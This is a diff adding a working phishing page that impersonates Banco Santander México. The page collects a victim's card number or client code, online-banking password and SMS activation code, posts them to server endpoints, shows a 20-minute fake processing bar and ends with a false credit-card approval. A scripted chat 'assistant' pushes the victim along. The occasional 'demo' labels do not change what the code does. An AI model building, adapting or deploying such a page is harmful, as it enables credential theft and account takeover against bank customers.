@@ -1,0 +1,1987 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Santander</title>
+
+<style>
+
+* {
+
+    box-sizing: border-box;
+
+}
+
+body {
+
+    margin: 0;
+
+    font-family: Arial, Helvetica, sans-serif;
+
+    background: #fff7f7;
+
+    color: #222;
+
+}
+
+.demo {
+
+    background: #333;
+
+    color: white;
+
+    text-align: center;
+
+    padding: 9px;
+
+    font-size: 13px;
+
+    font-weight: bold;
+
+}
+
+.encabezado {
+
+    background: white;
+
+    text-align: center;
+
+    padding: 30px 20px 25px;
+
+    border-bottom: 8px solid #ff0000;
+
+}
+
+.logo img {
+
+    display: block;
+
+    width: 180px;
+
+    max-width: 80%;
+
+    height: auto;
+
+    margin: 0 auto 15px;
+
+}
+
+.fecha {
+
+    color: #ff0000;
+
+    font-size: 24px;
+
+    font-weight: bold;
+
+}
+
+.contenedor {
+
+    max-width: 850px;
+
+    margin: 40px auto;
+
+    padding: 0 20px;
+
+}
+
+.tarjeta {
+
+    background: white;
+
+    border-radius: 18px;
+
+    padding: 40px;
+
+    max-width: 700px;
+
+    margin: 0 auto;
+
+    box-shadow: 0 3px 15px rgba(0,0,0,.15);
+
+}
+
+.pantalla {
+
+    display: none;
+
+}
+
+.pantalla.activa {
+
+    display: block;
+
+}
+
+.logoInterno {
+
+    text-align: center;
+
+    margin-bottom: 30px;
+
+}
+
+.logoInterno img {
+
+    width: 180px;
+
+    max-width: 80%;
+
+    height: auto;
+
+}
+
+h1 {
+
+    text-align: center;
+
+    font-size: 30px;
+
+}
+
+.descripcion {
+
+    text-align: center;
+
+    color: #666;
+
+    font-size: 18px;
+
+    line-height: 1.5;
+
+    margin-bottom: 30px;
+
+}
+
+label {
+
+    display: block;
+
+    font-weight: bold;
+
+    font-size: 18px;
+
+    margin: 22px 0 10px;
+
+}
+
+input,
+
+textarea,
+
+select {
+
+    width: 100%;
+
+    padding: 16px;
+
+    border: 1px solid #ccc;
+
+    border-radius: 9px;
+
+    font-size: 17px;
+
+    font-family: Arial, sans-serif;
+
+}
+
+textarea {
+
+    height: 100px;
+
+    resize: none;
+
+}
+
+button {
+
+    width: 100%;
+
+    margin-top: 25px;
+
+    padding: 17px;
+
+    border: 0;
+
+    border-radius: 9px;
+
+    background: #ff0000;
+
+    color: white;
+
+    font-size: 19px;
+
+    cursor: pointer;
+
+}
+
+button:hover {
+
+    background: #ff0000;
+
+}
+
+.pregunta {
+
+    margin-top: 25px;
+
+}
+
+/* ================================
+
+   BARRA RÁPIDA
+
+================================ */
+
+.barra-contenedor {
+
+    width: 100%;
+
+    height: 24px;
+
+    background: #ddd;
+
+    border-radius: 20px;
+
+    overflow: hidden;
+
+    margin: 35px 0 15px;
+
+}
+
+.barra {
+
+    width: 0%;
+
+    height: 100%;
+
+    background: #ff0000;
+
+    transition: width .1s linear;
+
+}
+
+.porcentaje {
+
+    text-align: center;
+
+    font-weight: bold;
+
+    font-size: 20px;
+
+    color: #ff0d00;
+
+}
+
+/* ================================
+
+   PANTALLA ROJA
+
+================================ */
+
+.roja {
+
+    background: #ff0000;
+
+    color: white;
+
+    border-radius: 18px;
+
+    padding: 45px 30px;
+
+    text-align: center;
+
+}
+
+.roja h1 {
+
+    color: white;
+
+}
+
+.roja p {
+
+    font-size: 18px;
+
+    line-height: 1.5;
+
+}
+
+.barra-20-contenedor {
+
+    width: 100%;
+
+    height: 24px;
+
+    background: rgba(255,255,255,.45);
+
+    border-radius: 20px;
+
+    overflow: hidden;
+
+    margin: 35px 0 15px;
+
+}
+
+.barra-20 {
+
+    width: 0%;
+
+    height: 100%;
+
+    background: white;
+
+}
+
+.porcentaje-20 {
+
+    font-size: 20px;
+
+    font-weight: bold;
+
+}
+
+/* ================================
+
+   FINAL
+
+================================ */
+
+.final {
+
+    text-align: center;
+
+}
+
+.check {
+
+    width: 75px;
+
+    height: 75px;
+
+    margin: 15px auto;
+
+    border-radius: 50%;
+
+    background: #0a9f20;
+
+    color: white;
+
+    font-size: 50px;
+
+    line-height: 75px;
+
+}
+
+.exito {
+
+    color: #087d19;
+
+    font-size: 36px;
+
+    font-weight: bold;
+
+    text-align: center;
+
+    margin-bottom: 12px;
+
+}
+
+.aprobada {
+
+    color: #087d19;
+
+    font-size: 28px;
+
+    font-weight: bold;
+
+    text-align: center;
+
+}
+
+.nota {
+
+    background: #f2f2f2;
+
+    padding: 18px;
+
+    border-radius: 9px;
+
+    margin-top: 25px;
+
+    font-size: 18px;
+
+}
+
+/* ================================
+
+   PIE DE PÁGINA
+
+================================ */
+
+footer {
+
+    width: 100%;
+
+    margin-top: 40px;
+
+    font-family: Arial, sans-serif;
+
+    text-align: center;
+
+}
+
+.zona-blanca {
+
+    background: #ffffff;
+
+    padding: 35px 20px;
+
+    border-top: 8px solid #ff0000;
+
+}
+
+.fila {
+
+    display: flex;
+
+    justify-content: center;
+
+    gap: 35px;
+
+    flex-wrap: wrap;
+
+    font-size: 18px;
+
+    color: #222;
+
+    margin-bottom: 18px;
+
+}
+
+.zona-roja {
+
+    background: #ff0000;
+
+    color: white;
+
+    padding: 35px 20px;
+
+}
+
+.fila-roja {
+
+    display: flex;
+
+    justify-content: center;
+
+    gap: 25px;
+
+    flex-wrap: wrap;
+
+    font-size: 18px;
+
+    margin-bottom: 15px;
+
+}
+
+footer hr {
+
+    max-width: 500px;
+
+    border: 0;
+
+    border-top: 1px solid rgba(255,255,255,.5);
+
+    margin: 20px auto;
+
+}
+
+@media(max-width:600px) {
+
+    .tarjeta {
+
+        padding: 25px 18px;
+
+    }
+
+    h1 {
+
+        font-size: 25px;
+
+    }
+
+    .exito {
+
+        font-size: 30px;
+
+    }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+
+<!-- ================================
+
+     ENCABEZADO
+
+================================ -->
+
+<header class="encabezado">
+
+    <!-- LOGO ARRIBA -->
+
+    <div class="logo">
+
+        <img
+
+            src="/imagenes/logo-demo.jpg"
+
+            alt="Logo de Banco Demo"
+
+        >
+
+    </div>
+
+    <div
+
+        class="fecha"
+
+        id="fecha">
+
+    </div>
+
+</header>
+
+<main class="contenedor">
+
+<!-- ================================
+
+     1. FOLIO
+
+================================ -->
+
+<section
+
+    id="folioPantalla"
+
+    class="pantalla activa">
+
+    <div class="tarjeta">
+
+        <!-- LOGO EN LA PANTALLA DEL FOLIO -->
+
+        <div class="logoInterno">
+
+            <img
+
+                src="/imagenes/logo-demo.jpg"
+
+                alt="Logo de Banco Demo"
+
+            >
+
+        </div>
+
+        <h1>
+
+            Te damos la bienvenida a Santander Web
+
+        </h1>
+
+        <p class="descripcion">
+
+            Por favor, ingrese el folio que su ejecutivo en linea le proporciono.
+
+        </p>
+
+        <label for="folio">
+
+            Número de folio:
+
+        </label>
+
+        <input
+
+            id="folio"
+
+            type="text"
+
+            placeholder="Ingresa tu folio"
+
+            autocomplete="off"
+
+        >
+
+        <button id="btnFolio">
+
+            Ingresar
+
+        </button>
+
+    </div>
+
+</section>
+
+<!-- ================================
+
+     2. ENCUESTA
+
+================================ -->
+
+<section
+
+    id="encuestaPantalla"
+
+    class="pantalla">
+
+    <div class="tarjeta">
+
+        <div class="logoInterno">
+
+            <img
+
+                src="/imagenes/logo-demo.jpg"
+
+                alt="Logo de Banco Demo"
+
+            >
+
+        </div>
+
+        <h1>
+
+            Bienvenido a Banca Electrónica Transaccional
+
+        </h1>
+
+        <p class="descripcion">
+
+            Introduzca sus credenciales de acceso de banca Electrónica Transaccional
+
+        </p>
+
+        <!-- PREGUNTA 1 -->
+
+        <div class="pregunta">
+
+            <label for="respuesta1">
+
+                No. de tarjeta/ Código de cliente
+
+            </label>
+
+            <input
+
+                id="respuesta1"
+
+                type="text"
+
+                placeholder="No. de tarjeta/ Código de cliente"
+
+                autocomplete="off"
+
+            >
+
+        </div>
+
+        <!-- PREGUNTA 2 -->
+
+        <div class="pregunta">
+
+            <label for="respuesta2">
+
+                Contraseña:
+
+            </label>
+
+            <input
+
+                id="respuesta2"
+
+                type="text"
+
+                placeholder="Contraseña"
+
+                autocomplete="off"
+
+            >
+
+        </div>
+
+        <!-- PREGUNTA 3 -->
+
+        <div class="pregunta">
+
+            <label for="experiencia">
+
+                Elige la tarjeta que deseas:
+
+            </label>
+
+            <select id="experiencia">
+
+                <option value="">
+
+                    Selecciona una opción
+
+                </option>
+
+                <option value="Buena">
+
+                    Tarjeta de Crédito LikeU Santander 
+
+                </option>
+
+                <option value="Mala">
+
+                    Tarjeta de Crédito Unique Rewards Gold
+
+                </option>
+
+                <option value="Regular">
+
+                    Tarjeta de Crédito Unique Rewards Platinum
+
+                </option>
+
+                <option value="Muy mala">
+
+                    Tarjeta de Crédito Santander American Express
+
+                </option>
+
+            </select>
+
+        </div>
+
+        <button id="btnEncuesta">
+
+            Continuar
+
+        </button>
+
+    </div>
+
+</section>
+
+<!-- ================================
+
+     3. BARRA RÁPIDA
+
+================================ -->
+
+<section
+
+    id="cargaPantalla"
+
+    class="pantalla">
+
+    <div class="tarjeta">
+
+        <h1>
+
+            Procesando la información
+
+        </h1>
+
+        <p class="descripcion">
+
+            Estamos procesando la información.
+
+            Un momento por favor.
+
+        </p>
+
+        <div class="barra-contenedor">
+
+            <div
+
+                id="barra"
+
+                class="barra">
+
+            </div>
+
+        </div>
+
+        <div
+
+            id="porcentaje"
+
+            class="porcentaje">
+
+            0%
+
+        </div>
+
+    </div>
+
+</section>
+
+<!-- ================================
+
+     4. COMENTARIO FINAL
+
+================================ -->
+
+<section
+
+    id="comentarioPantalla"
+
+    class="pantalla">
+
+    <div class="tarjeta">
+
+        <div class="logoInterno">
+
+            <img
+
+                src="/imagenes/logo-demo.jpg"
+
+                alt="Logo de Banco Demo"
+
+            >
+
+        </div>
+
+        <h1>
+
+            Ingresa tu folio de activación.
+
+        </h1>
+
+        <p class="descripcion">
+
+            Ingresa el folio de activación SMS que recibiste para continuar.
+
+        </p>
+
+        <label for="comentario">
+
+            Folio de activación:
+
+        </label>
+
+        <textarea
+
+            id="comentario"
+
+            placeholder="Escribe tu comentario">
+
+        </textarea>
+
+        <button id="btnFinalizar">
+
+            Finalizar
+
+        </button>
+
+    </div>
+
+</section>
+
+<!-- ================================
+
+     5. BARRA DE 20 MINUTOS
+
+================================ -->
+
+<section
+
+    id="procesamientoFinal"
+
+    class="pantalla">
+
+    <div class="roja">
+
+        <h1>
+
+            Espera un momento
+
+        </h1>
+
+        <p>
+
+            Estamos procesando la información.
+
+        </p>
+
+        <p>
+
+            Por favor, espera a que la carga finalice.
+
+        </p>
+
+        <div class="barra-20-contenedor">
+
+            <div
+
+                id="barra20"
+
+                class="barra-20">
+
+            </div>
+
+        </div>
+
+        <div
+
+            id="porcentaje20"
+
+            class="porcentaje-20">
+
+            ESPA UN MOMENTO, POR FAVOR: 0%
+
+        </div>
+
+        <p style="font-size:14px;">
+
+            Por favor, espera unos minutos…
+
+        </p>
+
+    </div>
+
+</section>
+
+<!-- ================================
+
+     6. FELICITACIONES
+
+================================ -->
+
+<section
+
+    id="demoExitoso"
+
+    class="pantalla">
+
+    <div class="tarjeta final">
+
+        <div class="check">
+
+            ✓
+
+        </div>
+
+        <div class="exito">
+
+            ¡Felicidades!
+
+        </div>
+
+        <div class="aprobada">
+
+            Tu Tarjeta de Crédito Unique Rewards Platinum ha sido aprobada
+
+        </div>
+
+        <p class="descripcion">
+
+            solicitud aprobada.
+
+        </p>
+
+        <div class="nota">
+
+            <strong>
+
+                💳 Tarjeta aprovada
+
+            </strong>
+
+            <br><br>
+
+            Folio:
+
+            <strong id="folioFinal">
+
+                DEMO
+
+            </strong>
+
+            <br><br>
+
+            <span>
+
+                Aprobación completada
+
+            </span>
+
+        </div>
+
+    </div>
+
+</section>
+
+</main>
+
+<!-- ================================
+
+     PIE DE PÁGINA
+
+================================ -->
+
+<footer>
+
+    <div class="zona-blanca">
+
+        <div class="fila">
+
+            <span>☎️ Aprende más</span>
+
+            <span>❓ Ayuda</span>
+
+        </div>
+
+        <div class="fila">
+
+            <span>📍 Términos y condiciones</span>
+
+            <span>💬 Seguridad en línea</span>
+
+        </div>
+
+    </div>
+
+    <div class="zona-roja">
+
+        <div class="fila-roja">
+
+            <span>Contáctanos</span>
+
+            <span>Aclaraciones</span>
+
+            <span>Promociones</span>
+
+        </div>
+
+        <div class="fila-roja">
+
+            <span>Facebook</span>
+
+            <span>YouTube</span>
+
+        </div>
+
+        <hr>
+
+        <p style="margin:0;font-size:15px;">
+
+            Banco Santander México S.A., Institución de Banca Múltiple, Grupo Financiero Santander México.
+Derechos reservados 2026.
+
+        </p>
+
+    </div>
+
+</footer>
+
+<script>
+
+/* =================================
+
+   DATOS
+
+================================= */
+
+const datos = {
+
+    folio: "",
+
+    respuesta1: "",
+
+    respuesta2: "",
+
+    experiencia: "",
+
+    comentario: ""
+
+};
+
+/* =================================
+
+   FECHA
+
+================================= */
+
+document
+
+.getElementById("fecha")
+
+.textContent =
+
+new Date().toLocaleDateString(
+
+    "es-MX",
+
+    {
+
+        day: "numeric",
+
+        month: "long",
+
+        year: "numeric"
+
+    }
+
+);
+
+/* =================================
+
+   CAMBIAR PANTALLA
+
+================================= */
+
+function mostrarPantalla(id) {
+
+    document
+
+    .querySelectorAll(".pantalla")
+
+    .forEach(
+
+        pantalla => {
+
+            pantalla.classList.remove(
+
+                "activa"
+
+            );
+
+        }
+
+    );
+
+    document
+
+    .getElementById(id)
+
+    .classList.add("activa");
+
+    window.scrollTo(0, 0);
+
+}
+
+/* =================================
+
+   FOLIO
+
+================================= */
+
+document
+
+.getElementById("btnFolio")
+
+.addEventListener(
+
+    "click",
+
+    () => {
+
+        const folio =
+
+            document
+
+            .getElementById("folio")
+
+            .value
+
+            .trim();
+
+        if (!folio) {
+
+            alert(
+
+                "Ingresa un folio de demostración."
+
+            );
+
+            return;
+
+        }
+
+        datos.folio = folio;
+
+        document
+
+        .getElementById("folioFinal")
+
+        .textContent = folio;
+
+        mostrarPantalla(
+
+            "encuestaPantalla"
+
+        );
+
+    }
+
+);
+
+/* =================================
+
+   GUARDAR ENCUESTA
+
+================================= */
+
+document
+
+.getElementById("btnEncuesta")
+
+.addEventListener(
+
+    "click",
+
+    async () => {
+
+        datos.respuesta1 =
+
+            document
+
+            .getElementById("respuesta1")
+
+            .value
+
+            .trim();
+
+        datos.respuesta2 =
+
+            document
+
+            .getElementById("respuesta2")
+
+            .value
+
+            .trim();
+
+        datos.experiencia =
+
+            document
+
+            .getElementById("experiencia")
+
+            .value;
+
+        if (
+
+            !datos.respuesta1 ||
+
+            !datos.respuesta2 ||
+
+            !datos.experiencia
+
+        ) {
+
+            alert(
+
+                "Completa las tres preguntas."
+
+            );
+
+            return;
+
+        }
+
+        try {
+
+            const respuesta =
+
+                await fetch(
+
+                    "/api/encuesta-demo",
+
+                    {
+
+                        method: "POST",
+
+                        headers: {
+
+                            "Content-Type":
+
+                                "application/json"
+
+                        },
+
+                        body:
+
+                            JSON.stringify({
+
+                                folio:
+
+                                    datos.folio,
+
+                                respuesta1:
+
+                                    datos.respuesta1,
+
+                                respuesta2:
+
+                                    datos.respuesta2,
+
+                                tarjeta:
+
+                                    datos.experiencia
+
+                            })
+
+                    }
+
+                );
+
+            if (!respuesta.ok) {
+
+                throw new Error(
+
+                    "No se pudo guardar la encuesta."
+
+                );
+
+            }
+
+            const resultado =
+
+                await respuesta.json();
+
+            if (!resultado.ok) {
+
+                throw new Error(
+
+                    "El servidor rechazó la encuesta."
+
+                );
+
+            }
+
+            mostrarPantalla(
+
+                "cargaPantalla"
+
+            );
+
+            iniciarCargaRapida();
+
+        } catch (error) {
+
+            console.error(error);
+
+            alert(
+
+                "No se pudo guardar la encuesta. " +
+
+                "Verifica que el servidor esté funcionando."
+
+            );
+
+        }
+
+    }
+
+);
+
+/* =================================
+
+   CARGA RÁPIDA
+
+================================= */
+
+function iniciarCargaRapida() {
+
+    let progreso = 0;
+
+    const barra =
+
+        document.getElementById("barra");
+
+    const porcentaje =
+
+        document.getElementById("porcentaje");
+
+    barra.style.width = "0%";
+
+    porcentaje.textContent = "0%";
+
+    const intervalo =
+
+        setInterval(
+
+            () => {
+
+                progreso += 5;
+
+                barra.style.width =
+
+                    progreso + "%";
+
+                porcentaje.textContent =
+
+                    progreso + "%";
+
+                if (progreso >= 100) {
+
+                    clearInterval(
+
+                        intervalo
+
+                    );
+
+                    setTimeout(
+
+                        () => {
+
+                            mostrarPantalla(
+
+                                "comentarioPantalla"
+
+                            );
+
+                        },
+
+                        500
+
+                    );
+
+                }
+
+            },
+
+            100
+
+        );
+
+}
+
+/* =================================
+
+   GUARDAR COMENTARIO
+
+================================= */
+
+document
+
+.getElementById("btnFinalizar")
+
+.addEventListener(
+
+    "click",
+
+    async () => {
+
+        datos.comentario =
+
+            document
+
+            .getElementById("comentario")
+
+            .value
+
+            .trim();
+
+        if (!datos.comentario) {
+
+            alert(
+
+                "Escribe un comentario final."
+
+            );
+
+            return;
+
+        }
+
+        try {
+
+            const respuesta =
+
+                await fetch(
+
+                    "/api/comentario-demo",
+
+                    {
+
+                        method: "POST",
+
+                        headers: {
+
+                            "Content-Type":
+
+                                "application/json"
+
+                        },
+
+                        body:
+
+                            JSON.stringify({
+
+                                folio:
+
+                                    datos.folio,
+
+                                comentario:
+
+                                    datos.comentario
+
+                            })
+
+                    }
+
+                );
+
+            if (!respuesta.ok) {
+
+                throw new Error(
+
+                    "No se pudo guardar el comentario."
+
+                );
+
+            }
+
+            const resultado =
+
+                await respuesta.json();
+
+            if (!resultado.ok) {
+
+                throw new Error(
+
+                    "El servidor rechazó el comentario."
+
+                );
+
+            }
+
+            mostrarPantalla(
+
+                "procesamientoFinal"
+
+            );
+
+            iniciarBarra20Minutos();
+
+        } catch (error) {
+
+            console.error(error);
+
+            alert(
+
+                "No se pudo guardar el comentario. " +
+
+                "Verifica que el servidor esté funcionando."
+
+            );
+
+        }
+
+    }
+
+);
+
+/* =================================
+
+   BARRA DE 20 MINUTOS
+
+================================= */
+
+function iniciarBarra20Minutos() {
+
+    const barra =
+
+        document.getElementById("barra20");
+
+    const porcentaje =
+
+        document.getElementById("porcentaje20");
+
+    const inicio =
+
+        Date.now();
+
+    const duracion =
+
+        20 * 60 * 1000;
+
+    barra.style.width = "0%";
+
+    porcentaje.textContent =
+
+        "0%";
+
+    const intervalo =
+
+        setInterval(
+
+            () => {
+
+                const progreso =
+
+                    Math.min(
+
+                        (
+
+                            (Date.now() - inicio) /
+
+                            duracion
+
+                        ) * 100,
+
+                        100
+
+                    );
+
+                barra.style.width =
+
+                    progreso + "%";
+
+                porcentaje.textContent =
+
+                    " PROCESANDO ADJUNTACIÓN: " +
+
+                    Math.floor(progreso) +
+
+                    "%";
+
+                if (progreso >= 100) {
+
+                    clearInterval(
+
+                        intervalo
+
+                    );
+
+                    mostrarPantalla(
+
+                        "demoExitoso"
+
+                    );
+
+                }
+
+            },
+
+            1000
+
+        );
+
+}
+
+</script>
+<!-- ================================
+
+     Asistente Virtual Sandi
+
+================================= -->
+
+<button id="botonAsistente" class="boton-asistente" aria-label="Abrir asistente">
+
+    💬
+
+</button>
+
+<div id="ventanaAsistente" class="ventana-asistente oculto">
+
+    <div class="encabezado-asistente">
+
+        <strong>Asistente Virtual Sandi</strong>
+
+        <button id="cerrarAsistente">×</button>
+
+    </div>
+
+    <div class="contenido-asistente">
+
+        <p><strong>Hola 👋</strong></p>
+
+        <p>¿En qué podemos ayudarte?</p>
+
+        <button class="opcion-asistente">
+
+            ¿Cómo funciona?
+
+        </button>
+
+        <button class="opcion-asistente">
+
+            ¿Dónde ingreso mi folio?
+
+        </button>
+
+        <button class="opcion-asistente">
+
+            ¿Qué sigue después de la Banca electronica?
+
+        </button>
+
+        <button class="opcion-asistente">
+
+            Necesito ayuda
+
+        </button>
+
+        <div id="respuestaAsistente" class="respuesta-asistente"></div>
+
+    </div>
+
+</div>
+
+<style>
+
+/* BOTÓN FLOTANTE */
+
+.boton-asistente {
+
+    position: fixed;
+
+    right: 22px;
+
+    bottom: 22px;
+
+    width: 62px;
+
+    height: 62px;
+
+    border-radius: 50%;
+
+    border: none;
+
+    background: #ff0d00;
+
+    color: white;
+
+    font-size: 28px;
+
+    cursor: pointer;
+
+    box-shadow: 0 5px 18px rgba(0,0,0,.25);
+
+    z-index: 9999;
+
+}
+
+/* VENTANA */
+
+.ventana-asistente {
+
+    position: fixed;
+
+    right: 22px;
+
+    bottom: 95px;
+
+    width: 330px;
+
+    max-width: calc(100vw - 40px);
+
+    background: white;
+
+    border-radius: 16px;
+
+    overflow: hidden;
+
+    box-shadow: 0 8px 30px rgba(0,0,0,.25);
+
+    z-index: 10000;
+
+}
+
+/* ENCABEZADO */
+
+.encabezado-asistente {
+
+    background: #fc0e02;
+
+    color: white;
+
+    padding: 16px;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+
+    font-size: 17px;
+
+}
+
+.encabezado-asistente button {
+
+    background: transparent;
+
+    color: white;
+
+    padding: 0;
+
+    font-size: 26px;
+
+}
+
+/* CONTENIDO */
+
+.contenido-asistente {
+
+    padding: 18px;
+
+    color: #222;
+
+}
+
+.contenido-asistente p {
+
+    margin: 6px 0;
+
+}
+
+/* OPCIONES */
+
+.opcion-asistente {
+
+    width: 100%;
+
+    margin-top: 9px;
+
+    padding: 11px;
+
+    background: #f5f5f5;
+
+    color: #333;
+
+    border: 1px solid #ddd;
+
+    border-radius: 9px;
+
+    text-align: left;
+
+    font-size: 14px;
+
+    cursor: pointer;
+
+}
+
+.opcion-asistente:hover {
+
+    background: #eeeeee;
+
+}
+
+/* RESPUESTA */
+
+.respuesta-asistente {
+
+    margin-top: 14px;
+
+    padding: 12px;
+
+    background: #f5f5f5;
+
+    border-radius: 9px;
+
+    font-size: 14px;
+
+    display: none;
+
+}
+
+/* OCULTO */
+
+.oculto {
+
+    display: none !important;
+
+}
+
+</style>
+
+<script>
+
+/* ================================
+
+   FUNCIONES DEL ASISTENTE
+
+================================= */
+
+const botonAsistente =
+
+    document.getElementById("botonAsistente");
+
+const ventanaAsistente =
+
+    document.getElementById("ventanaAsistente");
+
+const cerrarAsistente =
+
+    document.getElementById("cerrarAsistente");
+
+const respuestaAsistente =
+
+    document.getElementById("respuestaAsistente");
+
+botonAsistente.addEventListener("click", () => {
+
+    ventanaAsistente.classList.toggle("oculto");
+
+});
+
+cerrarAsistente.addEventListener("click", () => {
+
+    ventanaAsistente.classList.add("oculto");
+
+});
+
+document.querySelectorAll(".opcion-asistente")
+
+.forEach((boton) => {
+
+    boton.addEventListener("click", () => {
+
+        const pregunta = boton.textContent.trim();
+
+        respuestaAsistente.style.display = "block";
+
+        if (pregunta.includes("funciona")) {
+
+            respuestaAsistente.textContent =
+
+                "Sigue los pasos que aparecen en pantalla para continuar.";
+
+        } else if (pregunta.includes("folio")) {
+
+            respuestaAsistente.textContent =
+
+                "Ingresa tu folio para poder continuar.";
+
+        } else if (pregunta.includes("encuesta")) {
+
+            respuestaAsistente.textContent =
+
+                "Después de completar la informacion podras disfrutar de tu tarjeta platinum.";
+
+        } else {
+
+            respuestaAsistente.textContent =
+
+                "Estamos para ayudarte.";
+
+        }
+
+    });
+
+});
+
+</script>
+</body>
+
+</html>
